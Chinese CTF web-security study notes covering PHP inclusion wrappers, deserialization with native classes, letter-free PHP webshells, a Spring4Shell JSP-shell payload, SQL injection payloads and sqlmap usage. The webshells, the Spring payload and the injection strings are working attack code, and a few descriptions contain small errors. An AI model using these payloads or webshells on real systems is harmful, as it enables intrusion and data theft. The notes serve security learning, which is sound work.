在C/C++中我们利用``#include<>``来导入库，在java/python中我们利用``import``导入库，在php中，同样也有相似的操作``include();``和其衍生型。

对于include函数的不安全使用，可以使我们访问到服务器的一些原本不可见的地址。

include可以包含本地也可以包含远程，对于include函数的操作我们常用伪协议来读取需要的信息。

###### php://filter

php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。

php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

协议参数

| 名称                      | 描述                                                         |
| ------------------------- | ------------------------------------------------------------ |
| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |
| read=<读链的筛选列表>     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| write=<写链的筛选列表>    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或链。 |

常用：

``` php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```


利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。

而使用的convert.base64-encode，就是一种过滤器。

**过滤器**

- 字符串过滤器
  该类通常以string开头，对每个字符都进行同样方式的处理。

**string.rot13**

一种字符处理方式，字符右移十三位。

**string.toupper**

将所有字符转换为大写。

**string.tolower**

将所有字符转换为小写。

**string.strip_tags**
这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。

- 转换过滤器
  对数据流进行编码，通常用来读取文件源码。

**convert.base64-encode & convert.base64-decode**

base64加密解密

**convert.quoted-printable-encode & convert.quoted-printable-decode**

可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。

----- [file_put_content和死亡·杂糅代码](https://xz.aliyun.com/t/8163#toc-2)

###### data://

data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行

如

```
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

例题（惨痛经历）[强网杯2022青少年组 web2]

[第六届“强网杯”青少年专项赛](https://blog.csdn.net/JEWSWS/article/details/126803937)

###### file://

用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响
file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)
比如：http://www.xx.com?file=file:///etc/passsword

###### php://

在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用
php://作用为访问输入输出流

###### php://input

php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。

例如：
http://127.0.0.1/cmd.php?cmd=php://input
POST数据：``<?php phpinfo()?>``
注意：
当enctype="multipart/form-data"的时候 php://input` 是无效的

遇到file_get_contents()要想到用php://input绕过。

###### zip://,bzip2://,zlib://,phar://

zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行

###### [PHP巧用WebDAV绕过URL包含限制Getshell](https://www.anquanke.com/post/id/201060)

##### 8、$_SERVER[]利用

| 数组元素                         | 说明                                                         |
| -------------------------------- | ------------------------------------------------------------ |
| $_SERVER['PHP_SELF']             | 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://XXX.XXX.X. 的脚本中使用 $_SERVER['PHP_SELF'] 将得到 /test.php/foo.bar |
| $_SERVER['SERVER_ADDR']          | 当前运行脚本所在服务器的 IP 地址                             |
| $_SERVER['SERVER_NAME']          | 当前运行脚本所在服务器的主机名。如果脚本运行于虚拟主机中，该名称就由那个虚拟主机所设置的值决定 |
| $_SERVER['SERVER_PROTOCOL']      | 请求页面时通信协议的名称和版本。例如，“HTTP/1.0”             |
| $_SERVER['REQUEST_METHOD']       | 访问页面使用的请求方法。例如“GET”“HEAD”“POST”“PUT”           |
| $_SERVER['DOCUMENT_ROOT']        | 当前运行脚本所在的文档根目录。在服务器配置文件中定义         |
| $_SERVER['HTTP_ACCEPT_LANGUAGE'] | 当前请求头中 Accept-Language: 项的内容（如果存在）。例如，“en” |
| $_SERVER['REMOVE_ADDR']          | 浏览当前页面的用户 IP 地址，注意与 $_SERVER['SERVER_ADDR'] 的区别 |
| $_SERVER['SCRIPT_FILENAME']      | 当前执行脚本的绝对路径                                       |
| $_SERVER['SCRIPT_NAME']          | 包含当前脚本的路径                                           |
| $_SERVER['REQUEST_URI']          | URI 用来指定要访问的页面。例如，“index.html”                 |
| $_SERVER['PATH_INFO']            | 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息（如果存在）。例如，当前脚本是通过 URL http://c.biancheng.net/php/path_info.php/some/stuff?foo=bar 被访问的，那么 $_SERVER['PATH_INFO'] 将包含 /some/stuff |



#### 反序列化漏洞

php通过``serialize()``对一些类的对象进行序列化，之后通过``unserialize()``进行反序列化，在对象的生命周期中会调用多种魔术方法，我们可以将恶意代码注入到对象中，利用对象的魔术方法执行恶意代码。

被序列化的对象可以有如下解读：

```php
O:4:"Test":3:{s:7:"Testa";s:7:"private";s:1:"b";s:6:"public";s:4:"*c";s:9:"protected";}
```

>第一部分：**O:4:"Test":3:**
>O  表示一个对象 object
>4　 对象名称的长度为4
>Test 对象的名称
>3　 对象有3个属性（变量）
>第二部分：{s:7:"Testa";s:7:"private";s:1:"b";s:6:"public";s:4:"*c";s:9:"protected";}
>**s:7:"Testa";s:7:"private";**
>s 变量名字符串string
>7 变量名的长度为7　　/x00Test/x00a
>s 变量值字符串string
>7 变量值的长度
>private 变量值的内容
>**s:1:"b";s:6:"public";**
>相同的解释
>**s:4:"\*c";s:9:"protected";**
>4 变量名的长度为4　　/x00*/x00c

可以见到，序列化后的对象自带一定的参数，只要我们知道了对象的类组成，就可以在原来代码的基础上重新构建代码做到对象属性的修改。由于面向对象的多态性，只要符合原来类的属性与方法的对象，都是正确的。

特别地，有一些反序列化中常用的技巧——

##### 利用原生类

当没有提供给我们使用的类时，可以考虑利用原生类进行恶意操作。顾名思义，原生类默认在所有php中被继承，所以可以轻松使用这些原生类构造恶意对象。

-**DirectoryIterator类**

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。


DirectoryIterator 类会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：

例如：

```php
<?php
$dir=new DirectoryIterator("/");
echo $dir;
```


这个查不出来什么，如果想输出全部的文件名我们还需要对$dir对象进行遍历：

```php
<?php
$dir=new DirectoryIterator("/");
foreach($dir as $tmp){
    echo($tmp.'\<br>');
    //echo($tmp->toString().'\<br>); //与上句效果一样
}
```

代码里两个语句一样,这也印证了之前说的echo触发了Directorylterator 中的toString()方法 。

我们也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：

```php
<?php
$dir=new DirectoryIterator("glob:///*php*");
echo $dir;
```


 也可以通过目录穿越，确定我们已知的文件的具体路径：

```php
<?php
$dir=new DirectoryIterator("glob://./././flag.txt");  //目录穿越
echo $dir;
```

-**FilesystemIterator 类**
FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。

该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)

```php
<?php
$dir=new FilesystemIterator("/");
echo $dir;
```

```php
<?php
$dir=new FilesystemIterator("/");
foreach($dir as $tmp){
    echo($tmp.'<br>');
    //echo($f->__toString().'<br>');
}
```

 小发现：经 php_study 测试发现，如果123.php文件在D://phpstudy_Pro/WWW/ 下。我们可用于确定路径的文件也必须在其中，如D:// 或 D://phpstudy_Pro 或 D://php_study_Pro/WWW 。

-**GlobIterator 类**
GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()函数，可以通过模式匹配来寻找文件路径。使用这个类不需要额外写上glob://

还有：

Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。**也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的**。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如：例题里我们知道了flag的文件名特征为 以f开头的.txt文件，因此我们可以通过 GlobIterator类来模式匹配：

```php
<?php
$dir=new GlobIterator("f*txt");
echo $dir;
```

**可读取文件类**

-**SplFileObject 类**
SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等

```php
<?php
$dir=new SplFileObject("/flag.txt");
echo $dir;
?> 
//但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：
```

```php
<?php
    $dir = new SplFileObject("/flag.txt");
    foreach($dir as $tmp){
        echo ($tmp.'<br>');
    }
?>
```


最后，形如：

```php
echo new $this->key($this->value);
```

```php
$this -> a = new $this->key($this->value);
echo $this->a;
```

没有pop链的思路和可利用反序列化的函数，一般就是需要用原生类了。

只需要让$this->key值赋为我们想用原生函数，$this->value赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的第一个文件。

##### phar格式化反序列化

[\[SWPUCTF 2021 新生赛]babyunser (ctfer.vip)](https://www.ctfer.vip/problem/466)==>[SWPU-babyunser](https://blog.csdn.net/weixin_51213906/article/details/123132307)



#### 随机数预测

[\[GWCTF 2019]枯燥的抽奖](https://blog.csdn.net/qq_43801002/article/details/107760064)

php提供生成随机数的函数mt_scrand(seed)，而生成的伪随机数是线性的，我们可以通过生成的随机数反推种子，进而获得想要的内容。

#### WAF绕过

##### 垃圾数据法

```
1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&flag=php://filter/convert.base64-encode/resource=flag.php
```

#### WebShell

##### 无字母数字RCE

[一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

根本来看，无字母数字RCE就是利用php动态执行的特点拼凑payload

1.

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```

2.

```php
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;

$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});

$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
```

3.利用php对字符串自增操作的特性

[PHP: 递增／递减运算符 - Manual](https://www.php.net/manual/zh/language.operators.increment.php)

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

### （二）asp



### （三）java

#### Spring框架

我们可以认为**Spring**是一个超级粘合平台，除了自己提供功能外，还提供粘合其他技术和框架的能力，从而使我们可以更自由的选择到底使用什么技术进行开发。

Spring除了不能帮我们写业务逻辑，却能帮助我们简化开发，有以下几点：

1. Spring能帮我们根据配置文件创建及组装对象之间的依赖关系。
2. Spring面向切面编程能帮助我们无耦合的实现日志记录，性能统计，安全控制。
3. Spring能非常简单的帮我们管理数据库事务。
4. Spring还提供了与第三方数据访问框架（如Hibernate、JPA）无缝集成，而且自己也提供了一套JDBC访问模板，来方便数据库访问。
5. Spring还提供与第三方Web（如Struts、JSF）框架无缝集成，而且自己也提供了一套Spring MVC框架，来方便web层搭建。
6. Spring能方便的与Java EE（如Java Mail、任务调度）整合，与更多技术整合（比如缓存框架）。

有几个概念需要了解：

**应用程序**：是能完成我们所需要功能的成品，比如购物网站、OA系统、ERP系统。

**框架**：是能完成一定功能的半成品，比如我们可以使用框架进行购物网站开发；框架做一部分功能，我们自己做一部分功能，这样应用程序就创建出来了。而且框架规定了你在开发应用程序时的整体架构，提供了一些基础功能，还规定了类和对象的如何创建、如何协作等，从而简化我们开发，让我们专注于业务逻辑开发。

**非侵入式设计**：从框架角度可以这样理解，无需继承框架提供的类，这种设计就可以看作是非侵入式设计，如果继承了这些框架类，就是侵入设计，如果以后想更换框架之前写过的代码几乎无法重用，如果非侵入式设计则之前写过的代码仍然可以继续使用。

**轻量级&重量级**：轻量级是相对于重量级而言的，轻量级一般就是非入侵性的、所依赖的东西非常少、资源占用非常少、部署简单等等，其实就是比较容易使用，而重量级正好相反。

**POJO**：POJO（Plain Old Java Objects）简单的Java对象，它可以包含业务逻辑或持久化逻辑，但不担当任何特殊角色且不继承或不实现任何其它Java框架的类或接口。

**容器**：在日常生活中容器就是一种盛放东西的器具，从程序设计角度看就是装对象的的对象，因为存在放入、拿出等操作，所以容器还要管理对象的生命周期。

**控制反转：**即Inversion of Control，缩写为IoC，控制反转还有一个名字叫做依赖注入（Dependency Injection），就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。

**Bean**：一般指容器管理对象，在Spring中指Spring IoC容器管理对象。



##### Spring框架漏洞

- ##### CVE-2022-22965

2022年3月29日，Spring框架曝出RCE 0day漏洞。已经证实由于 SerializationUtils#deserialize 基于 Java 的序列化机制，可导致远程代码执行 (RCE)，使用JDK9及以上版本皆有可能受到影响。Springmvc框架参数绑定功能，绑定了请求里的参数造成变量注入，攻击者可以实现任意文件写入，漏洞点spring-beans包中。

payload:

```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    
suffix: %>//
c1: Runtime
c2: <%
DNT: 1

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

原理：

[CVE-2022-22965：Spring core RCE漏洞](https://blog.csdn.net/yandonglinxswl/article/details/124093703)

[Spring Core rce漏洞分析(CVE-2022-22965)](https://www.cnblogs.com/HighnessDragonfly/p/16148381.html)

#### Apache Struts2

[Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）](https://zhuanlan.zhihu.com/p/338497899)

[S2-062 远程命令执行漏洞复现（cve-2021-31805）](https://blog.csdn.net/qq_44110340/article/details/124279481)



### （四）python

[【一文掌握CTF中Python全部考点 】](https://www.freebuf.com/column/232197.html)

[【以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用】](https://xz.aliyun.com/t/9584)

#### python序列化对象和反序列化

python提供了两个模块``pickle``和``json``，可以使用它们对对象进行序列化。

```python
#dumps将对象序列化为字节数据 
>>> import pickle
>>> ls = [1,2,3]
>>> data = pickle.dumps(ls)
>>> data
b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.'
>>> f=open("a.txt",mode="wb")
>>> f.write(data)
22
>>> f.close()
 
>>> f=open("a.txt",mode="rb")
>>> f.read()
b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.'
>>> f.close()
#dump将对象序列化为字节数据并且保存到file文件中
>>> ls=[2,3,4]
>>> pickle.dump(ls,open("a.txt",mode="wb"))
>>> f=open("a.txt",mode="rb")
>>> f.read()
b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x02K\x03K\x04e.'
 
#loads将字节数据反序列化为对象
>>> f =open("a.txt","rb")
>>> show = f.read()
>>> show
b'\x80\x04\x95\x0f\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03K\x04K\x05e.'
>>> show=pickle.loads(show)
>>> show
[1, 2, 3, 4, 5]
>>> f.close()
#load将file中的字节数据反序列化为对象
>>> pickle.load(open("a.txt","rb"))
[1, 2, 3, 4, 5]
 
```

```python
#dumps方法
>>> import json
>>> d={"usename":"zhangsan","age":17}
>>> json.dumps(d)
'{"usename": "zhangsan", "age": 17}'
>>> s=json.dumps(d)
>>> f=open("a.txt","wt")
>>> f.write(s)
34
>>> f.close()
 
#loads方法
>>> f=open("a.txt","rt")
>>> ss = f.read()
>>> ss
'{"usename": "zhangsan", "age": 17}'
>>> json.loads(ss)
{'usename': 'zhangsan', 'age': 17}
>>> dd = json.loads(ss)
>>> dd
{'usename': 'zhangsan', 'age': 17}
>>> f.close()
```



## 五、数据库绕过与利用

### （一）SQL语句与注入

[SQL注入WIKI (radare.cn)](http://sqlwiki.radare.cn/)

[SQL注入(巨详解) - 美式加糖 - 博客园 (cnblogs.com)](https://www.cnblogs.com/peace-and-romance/p/15890387.html)

[sql注入详解_山山而川'的博客-CSDN博客_sql注入](https://blog.csdn.net/qq_44159028/article/details/114325805)

#### 常见的爆库操作

##### order by试出有几列

##### 暴露数据库名称

```
id = -1' union select 1,database,3 --+
```

##### 暴露表名称(查询该数据库下所有表)

```
id = -1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=<数据库名> --+
```

##### 暴露字段名(查询该表下所有字段)

```
id = -1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=<数据库名> and table_name=<表名> --+
id = -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'--+
```

##### 查数据

```
id=-1' union select 1,group_concat(username,0x5c,password),3 from security.users --+
id = -1' union select 1,2,group_concat(id,flag) from test_tb--+ 
id = -1' union select 1,2,group_concat(<字段1>,<字段2>) from <表>--+ 
```

##### 堆叠注入

本质就是多个命令一起注入，用分号隔开。

##### 万用密码：ffifdyop

ffifdyop
经过md5加密后：276f722736c95d99e921722cf9ed621c
再转换为字符串：'or'6<乱码>  即  'or'66�]��!r,��b

用途：
select * from admin where password=''or'6<乱码>'
就相当于select * from admin where password=''or 1  实现sql注入

##### mid(<字符串名称>,<起始位置>,[长度])

这个可以用来查看完整的flag

##### select columns from \`\<表名\> \`

反引号`不能省略

>关于在这里使用 ` 而不是 ’ 的一些解释：
>两者在linux下和windows下不同，linux下不区分，windows下区分。
>单引号 ’ 或双引号主要用于 字符串的引用符号
>反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键)
>有MYSQL保留字作为字段的，必须加上反引号来区分！！！
>如果是数值，请不要使用引号。

##### concat拼接

##### prepare

因为select被过滤了，所以先将select * from ` 1919810931114514 `进行16进制编码

再通过构造payload得

;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#

进而得到flag
prepare…from…是预处理语句，会进行编码转换。

execute用来执行由SQLPrepare创建的SQL语句。

SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。

原文链接：https://blog.csdn.net/qq_44657899/article/details/103239145



##### SQL字符替换

1．只过滤了空格
除了空格，在代码中可以代替的空白符还有%0a、%0b、%0c、%0d、%09、%a0（均为URL编码，%a0在特定字符集才能利用）和/**/组合、括号等。
在MySQL中，关键字是不区分大小写的，如果只匹配了"SELECT"，便能用大小写混写的方式轻易绕过，如"sEleCT"。

2．正则匹配
正则匹配关键字"\bselect\b"可以用形如"/！50000select/"的方式绕过

#### [SQL报错注入](https://blog.csdn.net/qq_62539372/article/details/125423579)

##### BigInt数据类型溢出：

exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错："DOUBLE value is out of range"

例：

?id=1" and exp(~(select * from (select user())a)) --+
先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a

然后在查询select * from a 查询a，将结果集a全部查询出来

查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错

payload：

获取表名：

```sql
?id=1" and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)) --+
//获取列名：

?id=1" and exp(~(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)a)) --+
//获取列名对应信息：

?id=1" and exp(~(select * from(select username from 'users' limit 0,1))) --+
```

适用mysql数据库版本是：5.5.5~5.5.49

除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入


##### 函数参数格式错误：

两个重要函数：updatexml（） extractvalue ()

我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错

updatexml()函数语法：updatexml(XML_document,Xpath_string,new_value)

XML_document:是字符串String格式，为XML文档对象名称

Xpath_string:Xpath格式的字符串

new_value:string格式，替换查找到的符合条件的数据

查询当前数据库的用户信息以及数据库版本信息:

```sql
?id=1" and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+
```

获取当前数据库下数据表信息：

```sql
?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
```

获取users表名的列名信息：

```sql
?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),3) --+
```

获取users数据表下username、password两列名的用户字段信息:

```sql
?id=1" and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+

?id=1" and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+
```

extractvalue()函数语法:extractvalue(XML_document,XPath_string)

获取当前是数据库名称及使用mysql数据库的版本信息：

```sql
?id=1" and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+
```

获取当前位置所用数据库的位置：

```sql
?id=1" and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+
```

获取表名：

```sql
?id=1" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+
```

获取users表的列名：

```sql
?id=1" and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+
```

获取对应的列名的信息(username/password):

```sql
?id=1" and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+
```

#### 常见函数

##### concat_();

concat ()方法用于连接两个或多个数组。
该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。
返回一个新的数组。该数组是通过把所有 arrayX 参数添加到 arrayObject 中生成的。如果要进行 concat 操作的参数是数组，那么添加的是数组中的元素，而不是数组。

#### sqlmap

##### 快速上手开始使用：

```bash
sqlmap -u http://xxx.xxx.xxx
查询是否可以注入
sqlmap -u http://xxx.xxx.xxx --dbs
查询数据库
sqlmap -u http://xxx.xxx.xxx -D <DatabaseName> --tables
查询表
sqlmap -u http://xxx.xxx.xxx -D <DatabaseName> -T <TableName> --columns
查询列
sqlmap -u http://xxx.xxx.xxx -D <DatabaseName> -T <TableName> -C <ColumnName> --dump
读取字段
```



##### 一.介绍

- 开源的SQL注入漏洞检测的工具，能够检测动态页面中的get/post参数，cookie，http头，还能够查看数据，文件系统访问，甚至能够操作系统命令执行。
- 检测方式：布尔盲注、时间盲注、报错注入、UNION联合查询注入、堆叠注入
- 支持数据库：Mysql、Oracle、PostgreSQL、MSSQL、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDb

##### 二.基本参数

**—update： 更新**

> python sqlmap.py —update

**-h：查看常用参数**

> python sqlmap.py -h

**-hh：查看全部参数**

> python sqlmap.py -h

**—version：查看版本**

> python sqlmap.py —version

**-v：查看执行过程信息，默认是1，一共 0 ~ 6**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -v 3

**-d ： mysql表示数据库类型、user:password表示目标服务器的账号和密码，@后表示要连接的服务器，3306表示端口，zakq_ dababasename表示连接的数据库名称**

> python sqlmap.py -d “mysql://root:root@192.168.126.128:3386/zkaq_databasename”

**—wizard ： 向导式**

> python sqlmap.py —wizard

##### 三.确定目标

**-u “URL” ： 指定URL，get请求方式**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“

**-m url.txt :：使用一个包含多个url的文件进行扫描。若有重复，sqlmap会自动识别成一个。**

> python sqlmap.py -m url.txt

**-g ：扫描，使用Google语法得到的url。**

> python sqlmap.py -g “inurl:\”.php?id=1\”

**-r request.txt ： Post提交方式，使用HTTP请求文件，该文件可从BurpSuit中导出。（BurpSuit抓包—>将请求复制到txt中即可）**

> python sqlmap.py -r request.txt

**-l log.txt —scope=”正则表达式”  ：Post提交方式，使用BurpSuit的log文件。（Options—>Misc—>Logging—>Proxy—>勾选Request ，scope的作用是 基于正则表达式去过滤日志内容，筛选需要扫描的对象。**

